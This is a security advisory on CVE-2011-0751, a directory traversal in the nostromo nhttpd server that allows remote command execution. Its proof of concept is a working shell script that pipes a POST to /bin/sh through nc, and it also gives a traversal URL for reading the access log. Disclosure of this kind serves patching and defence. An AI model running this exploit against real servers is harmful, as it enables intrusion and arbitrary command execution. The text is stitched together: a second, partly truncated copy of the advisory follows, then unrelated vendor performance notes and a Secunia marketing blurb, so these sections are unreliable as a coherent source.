## nostromo nhttpd directory traversal leading to arbitrary command execution

During a penetration test, RedTeam Pentesting discovered a directory
traversal vulnerability leading to arbitrary command execution in the
nostromo HTTP server.

### Details

* Product: nostromo (nhttpd)
* Affected Versions: <= 1.9.3
* Fixed Versions: 1.9.4
* Vulnerability Type: directory traversal
* Security Risk: high
* Vendor URL: `http://www.nazgul.ch/dev_nostromo.html`
* Vendor Status: patch available
* Advisory URL: `https://www.redteam-pentesting.de/advisories/rt-sa-2011-001`
* Advisory Status: published
* CVE: CVE-2011-0751
* CVE URL: `https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0751`

### Introduction

nhttpd is a simple, fast and secure HTTP server. It runs as a single
process, handling connections with select(2). For CGIs and directory
listing it does fork(2). nhttpd has the minimum of HTTP/1.1 and CGI/1.1
implemented.

(from the vendor’s homepage)

### More Details

When parsing HTTP requests, nostromo first checks for directory
traversal attempts by searching for /../ in the request URI. However
this check is performed before decoding escaped characters in the URI.
Thus, directory traversal is possible by e.g. escaping the slashes in
../ as %2f.

Unless the chroot feature of nostromo is used, any file in the system
that is readable with the runtime permissions of nostromo can be
accessed.

A peculiarity of nostromo is the handling of CGI scripts. Citing the
manual page, “CGIs are recognized by the file world executable flag”.
Therefore, any program or script, that is executable by the system user
nostromo runs as, will be executed when one tries to access it through
directory traversal. Any data received in the body of a HTTP POST
request will be sent to standard input of executed CGI scripts.

By using directory traversal to send a HTTP POST request to /bin/sh, and
providing shell commands in the request body, arbitrary command
execution is possible. Similarly, interpreters of programming languages
that execute program code they receive via standard input, such as perl
or python, can be used to execute arbitrary program code in those
languages.

### Proof of Concept

The access log of nostromo can be accessed using an URL like this:

`http://www.example.org/..%2flogs/access_log`

The following simple shell script implements the arbitrary command
execution described above using /bin/sh:

```
#!/bin/sh

if [ $# -lt 3 ]; then
    echo "Usage: $(basename $0) HOST PORT COMMAND..."
    exit 2
fi

HOST="$1"
PORT="$2"
shift 2

( \
    echo -n -e 'POST /..%2f..%2f..%2fbin/sh HTTP/1.0\r\n'; \
    echo -n -e 'Content-Length: 1\r\n\r\necho\necho\n'; \
    echo "$@ 2>&1" \
) | nc "$HOST" "$PORT" \
  | sed --quiet --expression ':S;/^\r$/{n;bP};n;bS;:P;n;p;bP'

```
### Workaround

When serving static files, the impact of this vulnerability can be
reduced by using the chroot feature of nostromo. If CGI scripts are
used, any interpreter required for these scripts might allow being
abused as shown above.
The nostromo configuration and log files remain accessible even when
using the chroot feature.

### Fix

Upgrade to version 1.9.4.

### Security Risk

As an attacker is potentially able to execute arbitrary commands
remotely, the risk is estimated as high.

Advisory: nostromo nhttpd directory traversal leading to arbitrary
command execution
During a penetration test, RedTeam Pentesting discovered a directory
traversal vulnerability leading to arbitrary command execution in the
nostromo HTTP server.
Details
=======
Product: nostromo (nhttpd)
Affected Versions: <= 1.9.3
Fixed Versions: CVS 2011-03-03, 1.9.4
Vulnerability Type: directory traversal
Security Risk: high
Vendor URL: http://www.nazgul.ch/dev\_nostromo.html
Vendor Status: patch available
Advisory URL: http://www.redteam-pentesting.de/advisories/rt-sa-2011-001
Advisory Status: published
CVE: CVE-2011-0751
CVE URL: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0751

============
When parsing HTTP requests, nostromo first checks for directory

this check is performed before decoding escaped characters in the URI.
Thus, directory traversal is possible by e.g. escaping the slashes in

The nostromo configuration and log files remain accessible even when

Fix
===
Upgrade to development version from CVS as of 2011-03-03 or version
1.9.4, once released.

As an attacker is potentially able to execute arbitrary commands

## Introduction

nhttpd is a simple, fast and secure HTTP server. It runs as a single
process, handling connections with select(2). For CGIs and directory
listing it does fork(2). nhttpd has the minimum of HTTP/1.1 and CGI/1.1
implemented. Also supported are; chroot, setuid, basic authentication,
SSL, IPv6, custom repsonses, aliases, and virtual hosts. To stop the
server send a SIGTERM signal to the PID. The access log is written in
standard CLF format.

Read more in the [man page](/dev/nostromo_man.html).

*Note:*
Compilation and testing has been successfully done on OpenBSD, FreeBSD,
NetBSD, and Linux.

## Performance

*Updated: 19th January 2006*

To see how nostromo performs, we have compared it with two popular
webservers. That is apache and thttpd. The load has been generated with
http\_load. We used a sparc as client and an intel as server connected to
a switch, all 100Mbit. Here the data put together in detail:

### Webservers

apache 1.3.29

thttpd 2.25b

nostromo 1.7.7
### Webclient simulation

```
http_load -checksum -parallel n -seconds 15 url
```
### Hardware

Client: resurrection, Sun Ultra 2, SPARC 400MHz, 100Mbit NIC

Server: gollum, Intel, x86 3GHz, 100Mbit NIC

We did the measurement for three different scenarios; small files of 1KB,
larger files of 16KB, and a small CGI. The measurement always started with 5
concurrent clients and increased for 5 clients every 15 seconds until the
maximum of 300 concurrent clients was reached. To be sure that the sent
data was right, we turned on checksum verification in http\_load.

The measurements have been repeated several times at different days and
compared together, so we can be sure that the results are correct. And
here they are:

[![httperf small](/images/httperf_small.png)](/images/httperf_small-l.png)

[![httperf large](/images/httperf_large.png)](/images/httperf_large-l.png)

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
